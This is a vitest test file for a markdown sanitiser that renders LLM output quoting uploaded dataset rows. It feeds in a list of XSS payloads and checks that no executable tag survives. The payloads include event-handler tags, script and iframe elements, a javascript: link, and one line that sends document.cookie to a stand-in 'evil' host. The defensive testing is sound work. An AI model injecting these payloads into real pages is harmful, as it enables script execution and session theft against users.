import { describe, expect, it } from "vitest";
import { renderMarkdownSafe } from "../markdown";

// The payloads are the point: this helper exists because campaign artifacts quote LLM output,
// which quotes dataset rows a tenant uploaded. Each case is a construct that reached the
// operator's browser through `marked.parse` + dangerouslySetInnerHTML before the tokenizer
// override. Assert on the ABSENCE of the executable part, never on exact entity spelling —
// escaping is marked's to choose, and pinning its output would fail on an upgrade that is
// still safe.
const EXECUTABLE = [
  ["block img handler", `<img src=x onerror="fetch('https://evil/'+document.cookie)">`],
  ["inline img handler", `a row that says <img src=x onerror=alert(1)> mid-sentence`],
  ["svg onload", `<svg onload=alert(1)>`],
  ["script element", `<script>alert(1)</script>`],
  ["iframe srcdoc", `<iframe srcdoc="<script>alert(1)</script>">`],
  ["body onload via tag", `<body onload=alert(1)>`],
  ["anchor with js scheme", `<a href="javascript:alert(1)">click</a>`],
  ["details ontoggle", `<details open ontoggle=alert(1)>x</details>`],
] as const;

describe("renderMarkdownSafe", () => {
  it.each(EXECUTABLE)("neutralises %s", (_name, payload) => {
    const html = renderMarkdownSafe(payload);
    // No live element and no handler survives as markup. `onerror=` may appear as escaped TEXT,
    // so the test is that no `<tag` opened it — an attribute outside a tag cannot execute.
    expect(html).not.toMatch(/<\s*(script|img|svg|iframe|body|details|a\s)/i);
    expect(html).not.toContain("<script");
  });

  it("still renders the markdown the viewer exists to show", () => {
    const html = renderMarkdownSafe(
      ["# Round 2", "", "- improved: **yes**", "", "`composite_fitness`", "", "| a | b |", "| - | - |", "| 1 | 2 |"].join("\n"),
    );
    expect(html).toContain("<h1");
    expect(html).toContain("<strong>yes</strong>");
    expect(html).toContain("<code>composite_fitness</code>");
    expect(html).toContain("<table");
  });

  it("keeps code fences readable rather than entity-noisy", () => {
    // The reason raw HTML is killed at the tokenizer instead of by pre-escaping the source:
    // pre-escaping would surface `&amp;lt;` inside fences, where the content is already safe.
    const html = renderMarkdownSafe(["```", "<div>literal</div>", "```"].join("\n"));
    expect(html).toContain("&lt;div&gt;literal&lt;/div&gt;");
    expect(html).not.toContain("&amp;lt;");
  });
});
